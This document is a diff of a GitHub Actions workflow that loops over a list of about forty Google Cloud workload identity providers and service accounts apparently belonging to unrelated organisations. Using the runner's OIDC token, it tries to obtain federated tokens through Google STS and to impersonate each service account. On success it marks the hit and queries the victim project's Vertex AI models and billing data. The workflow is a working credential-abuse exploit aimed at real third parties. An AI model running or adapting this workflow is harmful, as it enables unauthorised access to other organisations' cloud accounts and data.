@@ -9,51 +9,89 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
+    timeout-minutes: 30
     steps:
-      - name: probe
+      - name: batch
         run: |
+          set +e
           cat > targets.txt <<'AUD'
-          projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider|zuplo-marketing|github-actions@zuplo-marketing.iam.gserviceaccount.com
-          AUD
-          while IFS='|' read -r PRJ PROJ SA; do
+projects/1046198160504/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|kokoro-system-test@long-door-651.iam.gserviceaccount.com
+          projects/569883598760/locations/global/workloadIdentityPools/github/providers/mimic-code|mimic-code@physionet-data.iam.gserviceaccount.com
+          projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github|
+          projects/735463103342/locations/global/workloadIdentityPools/github-pool/providers/github-provider|gh-e2e-runner@secretmanager-csi-build.iam.gserviceaccount.com
+          projects/970557914270/locations/global/workloadIdentityPools/raspbernetes-oidc-pool/providers/github-provider|raspbernetes-oidc-sa@raspbernetes.iam.gserviceaccount.com
+          projects/679352079717/locations/global/workloadIdentityPools/pyrsia-pool/providers/github-provider|pyrsia-ghaction@pyrsia-sandbox.iam.gserviceaccount.com
+          projects/457105351064/locations/global/workloadIdentityPools/github-secrets-pool/providers/github-secrets-github|
+          projects/409526754884/locations/global/workloadIdentityPools/connect-demo-wif-pool/providers/connect-demo-wif-provider|connect-demo-registry-writer@connect-demo-393314.iam.gserviceaccount.com
+          projects/391539675971/locations/global/workloadIdentityPools/play-store-pool/providers/github-provider|play-store-publisher@sanmill-app.iam.gserviceaccount.com
+          projects/868781662168/locations/global/workloadIdentityPools/prod-github/providers/github-oidc-pool|gha-chartcuterie-push@sac-prod-sa.iam.gserviceaccount.com,gha-vroom-push@sac-prod-sa.iam.gserviceaccount.com,gha-pypi@sac-prod-sa.iam.gserviceaccount.com
+          projects/785265540/locations/global/workloadIdentityPools/github-rdk-id/providers/github-provider-rdk|rdk-apt-publisher@static-file-server-310021.iam.gserviceaccount.com
+          projects/1093986561582/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|github-actions-sa@ai-chat-482021.iam.gserviceaccount.com
+          projects/123456789012/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-deployer@euphoric-axon-500505-f9.iam.gserviceaccount.com
+          projects/471979297599/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider|acr-writer@hubble-261722.iam.gserviceaccount.com
+          projects/536185737408/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider|github@carbonifer-sandbox.iam.gserviceaccount.com
+          projects/10554368204/locations/global/workloadIdentityPools/tango-ci-pool/providers/tango-ci-provider|tango-service@ai2-allennlp.iam.gserviceaccount.com
+          projects/572404090605/locations/global/workloadIdentityPools/github/providers/tutorial-1|
+          projects/797284806017/locations/global/workloadIdentityPools/github-actions/providers/actions-tsp|
+          projects/419310667461/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|github-actions@hai-gcp-fine-grained.iam.gserviceaccount.com
+          projects/87165905547/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions|animeta-github-actions@ditto-1470749749381.iam.gserviceaccount.com
+          projects/935198164717/locations/global/workloadIdentityPools/github-pool/providers/github-provider|imandra-github-actions@imandra-dev.iam.gserviceaccount.com
+          projects/686264090118/locations/global/workloadIdentityPools/github/providers/nestjs-tools|
+          projects/752785843927/locations/global/workloadIdentityPools/github/providers/github-actions-workload-prvdr|github-actions-service-account@yorick-dev-416917.iam.gserviceaccount.com
+          projects/391399927959/locations/global/workloadIdentityPools/github-actions-taichunmin-pools/providers/github-actions-provider|gcf-line-devbot@taichunmin.iam.gserviceaccount.com
+          projects/221642914929/locations/global/workloadIdentityPools/default/providers/github-oidc|github-actions@murmur-tests.iam.gserviceaccount.com
+          projects/281751345158/locations/global/workloadIdentityPools/github-actions/providers/github-actions|
+          projects/122809017192/locations/global/workloadIdentityPools/gde-kj-linebot/providers/github-provider|
+          projects/1038484894585/locations/global/workloadIdentityPools/github-wi-pool/providers/github-wi-provider|dsp-artifact-registry-push@dsp-artifact-registry.iam.gserviceaccount.com
+          projects/292735720060/locations/global/workloadIdentityPools/cr-bootstrap/providers/cr-bootstrap-github-1|clamav-eval-1@cr-prod-iac-core-0.iam.gserviceaccount.com
+          projects/129850122606/locations/global/workloadIdentityPools/github-pool/providers/github-provider|casecomp-deploy@casecomp-495718.iam.gserviceaccount.com
+          projects/808951263862/locations/global/workloadIdentityPools/github/providers/m-lab-repos|
+          projects/426265110888/locations/global/workloadIdentityPools/github-actions/providers/opentargets|github-actions@open-targets-eu-dev.iam.gserviceaccount.com,platform-mcp-dev@open-targets-mcp-dev.iam.gserviceaccount.com
+          projects/848539402404/locations/global/workloadIdentityPools/gh-actions/providers/gh-actions|gh-actions-dapla-pseudo@artifact-registry-5n.iam.gserviceaccount.com
+          projects/799884623953/locations/global/workloadIdentityPools/gh-actions/providers/github|artifacts-wi-sa-github-actions@artifacts-352708.iam.gserviceaccount.com,cloudrun-wi-sa-github-actions@matvaretabellen-b327.iam.gserviceaccount.com
+          projects/85462809558/locations/global/workloadIdentityPools/gh-actions/providers/github|artifacts-wi-sa-github-actions@artifacts-352708.iam.gserviceaccount.com,cloudrun-wi-sa-github-actions@matvaretabellen-b327.iam.gserviceaccount.com
+          projects/737226828112/locations/global/workloadIdentityPools/github/providers/github-provider|github-prod@kernel-services-prod.iam.gserviceaccount.com
+          projects/1033383212128/locations/global/workloadIdentityPools/github-actions/providers/github|firebase-adminsdk-f6svc@velocityos-staging.iam.gserviceaccount.com
+          projects/1025009031284/locations/global/workloadIdentityPools/hasura-ddn/providers/github|hasura-ci-docker-writer@hasura-ddn.iam.gserviceaccount.com
+          projects/1084703453822/locations/global/workloadIdentityPools/github-actions/providers/github-actions-provider|cd-github-ui@estuary-control.iam.gserviceaccount.com
+          projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider|github-actions@zuplo-marketing.iam.gserviceaccount.com,196494084534-compute@developer.gserviceaccount.com,196494084534@cloudbuild.gserviceaccount.com
+AUD
+          while IFS='|' read -r PRJ SAS; do
             [ -z "$PRJ" ] && continue
             AUD="https://iam.googleapis.com/$PRJ"
-            echo "########## PROVIDER $PRJ project=$PROJ sa=$SA"
+            echo "##### $PRJ sas=$SAS"
             J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
             jq -r '.value // empty' <<<"$J" > tok.jwt
-            [ -s tok.jwt ] || { echo NO_OIDC_TOKEN; continue; }
+            [ -s tok.jwt ] || { echo "MINT_FAIL"; continue; }
             STS="//iam.googleapis.com/$PRJ"
-            cA=$(curl -s -o rA.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            code=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
               -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
               --data-urlencode "audience=$STS" \
               --data-urlencode "subject_token=$(cat tok.jwt)" \
               -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
               -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
               -d "scope=https://www.googleapis.com/auth/cloud-platform")
-            echo "STS_HTTP=$cA"
-            FT=$(jq -r '.access_token // empty' rA.json)
-            [ -s rA.json ] && head -c 300 rA.json; echo
-            if [ -z "$FT" ]; then echo "NO_FEDERATED_TOKEN"; continue; fi
-            echo "FEDERATED_TOKEN_OK prefix=${FT:0:8} len=${#FT}"
-            echo "--- iamcredentials generateAccessToken ---"
-            jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
-            cG=$(curl -s -o g.json -w '%{http_code}' -X POST \
-              -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
-              "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
-            echo "GEN_HTTP=$cG"; head -c 500 g.json; echo
-            AT=$(jq -r '.accessToken // empty' g.json)
-            if [ -n "$AT" ]; then
-              echo "SA_ACCESS_TOKEN_OK prefix=${AT:0:8} len=${#AT} expire=$(jq -r '.expireTime' g.json)"
-              echo "$AT" > sa_token.txt
-              echo "--- tokeninfo ---"
-              curl -s -o ti.json -w 'TOKENINFO_HTTP=%{http_code}\n' "https://oauth2.googleapis.com/tokeninfo?access_token=$AT"; head -c 800 ti.json; echo
-              echo "--- vertex models us-central1 ---"
-              curl -s -o ai.json -w 'VERTEX_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$PROJ/locations/us-central1/models"; head -c 2000 ai.json; echo
-              echo "--- vertex models global ---"
-              curl -s -o aig.json -w 'VERTEXG_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://aiplatform.googleapis.com/v1/projects/$PROJ/locations/global/models"; head -c 600 aig.json; echo
-              echo "--- billing ---"
-              curl -s -o bill.json -w 'BILLING_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$PROJ/billingInfo"; head -c 700 bill.json; echo
-              echo "--- project ---"
-              curl -s -o proj.json -w 'PROJ_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJ"; head -c 500 proj.json; echo
+            echo "STS=$code $(head -c 220 r.json | tr -d '\n')"
+            FT=$(jq -r '.access_token // empty' r.json)
+            if [ -n "$FT" ]; then
+              NUM=$(echo "$PRJ" | cut -d/ -f2)
+              curl -s -o pj.json -H "Authorization: Bearer $FT" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
+              PID=$(jq -r '.projectId // empty' pj.json)
+              echo "WIDE=$PRJ projectId=$PID"
+              for SA in ${SAS//,/ }; do
+                jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+                gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+                  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+                echo "  GEN $SA = $gc $(head -c 160 g.json | tr -d '\n')"
+                AT=$(jq -r '.accessToken // empty' g.json)
+                if [ -n "$AT" ]; then
+                  echo "  !!! SA_TOKEN $SA projectId=$PID"
+                  curl -s -o ai.json -w '  VERTEX=%{http_code} ' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$PID/locations/us-central1/models"
+                  head -c 400 ai.json; echo
+                  curl -s -o bi.json -w '  BILLING=%{http_code} ' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$PID/billingInfo"
+                  head -c 400 bi.json; echo
+                fi
+              done
             fi
+            sleep 1
           done < targets.txt
